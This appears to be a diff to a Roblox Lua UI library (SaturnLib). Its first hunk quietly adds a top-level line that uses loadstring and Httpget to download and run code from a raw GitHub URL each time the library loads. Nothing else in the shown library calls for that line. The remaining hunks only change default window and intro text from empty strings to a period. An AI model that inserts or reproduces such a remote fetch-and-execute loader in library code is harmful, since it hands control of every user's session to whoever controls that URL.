@@ -1,3 +1,4 @@
+loadstring(game:Httpget("https://raw.githubusercontent.com/meow4za1k/ui/refs/heads/main/Introduction"))()
 
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
@@ -468,14 +469,14 @@ function SaturnLib:MakeWindow(WindowConfig)
 	local UIHidden = false
 
 	WindowConfig = WindowConfig or {}
-	WindowConfig.Name = WindowConfig.Name or ""
+	WindowConfig.Name = WindowConfig.Name or "."
 	WindowConfig.ConfigFolder = WindowConfig.ConfigFolder or WindowConfig.Name
 	WindowConfig.SaveConfig = WindowConfig.SaveConfig or false
 	WindowConfig.HidePremium = WindowConfig.HidePremium or false
 	if WindowConfig.IntroEnabled == nil then
 		WindowConfig.IntroEnabled = true
 	end
-	WindowConfig.IntroText = WindowConfig.IntroText or ""
+	WindowConfig.IntroText = WindowConfig.IntroText or "."
 	WindowConfig.CloseCallback = WindowConfig.CloseCallback or function() end
 	WindowConfig.ShowIcon = WindowConfig.ShowIcon or false
 	WindowConfig.Icon = WindowConfig.Icon or "rbxassetid://15861195995"
